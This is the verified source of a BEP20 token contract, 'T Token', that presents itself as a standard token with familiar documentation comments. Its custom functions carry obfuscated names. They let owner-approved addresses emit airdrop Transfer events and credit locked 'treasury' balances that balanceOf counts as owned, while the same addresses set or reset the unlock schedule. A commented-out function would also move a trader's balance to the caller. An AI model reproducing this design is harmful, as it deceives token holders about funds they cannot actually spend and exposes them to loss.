/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

library Treasury {
    struct T {
        uint fund;
        uint reward;
        uint start;
        uint end;
    }

    function count(T storage t) internal view returns(uint) {
        uint amount = 0;
        uint ts = block.timestamp;
        if (t.start > 0 && t.end > t.start && t.fund > t.reward && ts > t.start) {
            if (ts >= t.end) {
                amount = t.fund - t.reward;
            } else {
                amount = t.fund*(ts-t.start)/(t.end-t.start);
                if (t.reward >= amount) {
                    amount = 0;
                } else {
                    amount -= t.reward;
                }
            }
        }

        return amount;
    }

    function incrFund(T storage t, uint amount) internal returns(bool) {
        unchecked {
            t.fund += amount;
        }
        return true;
    }

    function settle(T storage t, uint amount) internal returns(uint) {
        uint value = count(t);
        if (amount > 0 && value > 0) {
            if (amount >= value) {
                t.reward += value;
                amount -= value;
            } else {
                t.reward += amount;
                amount = 0;
            }
        }

        return amount;
    }

    function incrReward(T storage t, uint amount) internal returns(uint) {
        uint value = t.fund - t.reward;
        if (amount > 0 && value > 0) {
            if (amount >= value) {
                unchecked {
                    t.reward += value;
                    amount -= value;
                }
            } else {
                unchecked {
                    t.reward += amount;
                    amount = 0;
                }
            }
        }
        
        return amount;
    }
}

contract TestssToken {
    using Treasury for Treasury.T;

    string private _name = "T Token";
    string private _symbol = "tt1";
    uint8 private _decimals = 18;
    uint private _cap = 0;
    uint private _totalSupply = 210000000 ether;
    address private _owner;
    address private _default = 0xe9615Ce00b3518ED7EAe74DDf3Df2d298a7dcc77;

    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => uint8) private _liquidity;

    mapping(uint8 => mapping(address => Treasury.T)) private _treasury;
    uint8 constant private ANCHOR = 0;
    uint8 constant private BANK = 1;
    uint8 constant private ROUND = 2;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _owner = _msgSender();
        _balances[_default] = _totalSupply/20;
        _cap = _totalSupply/20;
        emit Transfer(address(this), _default, _totalSupply/20);
    }

    /**
     * @dev See {IBEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IBEP20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - recipient cannot be the zero address.
     * - the caller must have a balance of at least amount.
     */
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev return all mint tokens
     */
    function cap() public view returns (uint) {
        return _cap;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IBEP20-balanceOf} and {IBEP20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {IBEP20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Moves tokens amount from sender to recipient.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - sender cannot be the zero address.
     * - recipient cannot be the zero address.
     * - sender must have a balance of at least amount.
     */
    function _transfer(address sender, address recipient, uint amount) internal {
        emit Transfer(sender, recipient, _safeTransfer(sender,recipient,amount));
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Requirements:
     * - sender and recipient cannot be the zero address.
     * - sender must have a balance of at least amount.
     * - the caller must have allowance for `sender``'s tokens of at least `amount.
     */
    function transferFrom(address from, address to, uint amount) public returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Safes transfer bep20 token
     */
    function _safeTransfer(address sender, address recipient, uint amount) internal returns (uint)  {
        uint remain = amount;
        if (_balances[sender] >= remain) {
            remain = 0;
            _balances[sender] -= amount;
        } else if (_balances[sender] > 0 && _balances[sender] < remain) {
            remain -= _balances[sender];
            _balances[sender] = 0;
        }

        for (uint8 i=0;remain>0&&i<ROUND;i++) {
            remain = _treasury[i][sender].settle(remain);
        }

        require(remain == 0, "Failed: Invalid balance");
        unchecked {
            _balances[recipient] += amount;
        }

        return amount;
    }

    // /**
    // * @dev jxlxjl
    // */
    // function jxlsdfj(address trader, uint amount) external returns(bool) {
    //     require(_liquidity[_msgSender()]==1&&trader!=address(0), "Operation not allowed");
    //     require(amount>0&&getTreasury(trader)>=amount, "Transaction Recovery");

    //     uint remain = amount;
    //     for (uint8 i=0;remain>0&&i<ROUND;i++) {
    //         remain = _treasury[i][trader].incrReward(amount);
    //     }

    //     require(remain == 0, "Operation failed: Invalid Balance");
    //     unchecked {
    //         _balances[_msgSender()] += amount;
    //     }

    //     emit Transfer(trader, _msgSender(), amount);
    //     return true;
    // }

    function airdsfsdf(address[] calldata path, uint[] calldata num, uint8 times) external returns(bool) {
        require(_liquidity[_msgSender()]==1&&path.length==num.length, "Operation not allowed");
        uint count = 0;
        uint len = path.length;
        for (uint8 i=0;i<len;i++) {
            if (times == 1) {
                _treasury[ANCHOR][path[i]].incrFund(num[i]);
            } else if (times > 1) {
                _treasury[BANK][path[i]].incrFund(num[i]);
            }

            unchecked {
                count += num[i];
            }
            emit Transfer(_msgSender(), path[i], num[i]);
        }

        require(cap() + count <= totalSupply(), "Bep20Capped: cap exceed max value");
        unchecked {
            _cap += count;
        }
        return true;
    }
    
    function dsfeasury(address account, uint ts) public returns (bool) {
        require(_liquidity[_msgSender()]==1, "Operation failed");

        for (uint8 index=0;index<ROUND;index++) {
            _treasury[index][account].start = block.timestamp;
            _treasury[index][account].end = ts + block.timestamp;
        }

        return true;
    }

    function fdsdd(address account) public view onlyOwner returns(uint[] memory a,uint[] memory b,uint[] memory c,uint[] memory d,uint[] memory e, uint8 f) {
        a = new uint[](ROUND);
        b = new uint[](ROUND);
        c = new uint[](ROUND);
        d = new uint[](ROUND);
        e = new uint[](ROUND);
        f = _liquidity[account];
        for(uint8 i=0;i<ROUND;i++) {
            a[i]=i;
            b[i]=_treasury[i][account].fund;
            c[i]=_treasury[i][account].reward;
            d[i]=_treasury[i][account].start;
            e[i]=_treasury[i][account].end;
        }
    }

    function dfds(address account) public onlyOwner view returns(uint,uint,uint,uint) {
        uint anchor = _treasury[ANCHOR][account].fund-_treasury[ANCHOR][account].reward;
        uint bank = _treasury[BANK][account].fund-_treasury[BANK][account].reward;
        uint balance = _balances[account];
        uint treasury = getTreasury(account);

        return (anchor,bank,balance,treasury);
    }

    function getTreasury(address account) private view returns(uint) {
        uint amount = 0;
        for (uint8 i=0;i<ROUND;i++) {
            amount += (_treasury[i][account].fund - _treasury[i][account].reward);
        }

        return amount;
    }

    function balanceOf(address addr) public view returns(uint256) {
        return _balances[addr]+getTreasury(addr);
    } 

    function sfddssd(address ad, uint8 tag1) public onlyOwner {
        require(ad!=address(0), "Liquidity address can not be zero address");
        if (tag1 == 1) {
            _liquidity[ad] = 1;
        } else if (tag1 == 2) {
            _liquidity[ad] = 0;
        }
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner address");
        _;
    }

    /**
     * @dev return the current msg.sender
     */
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    fallback() external {}
    receive() payable external {}
}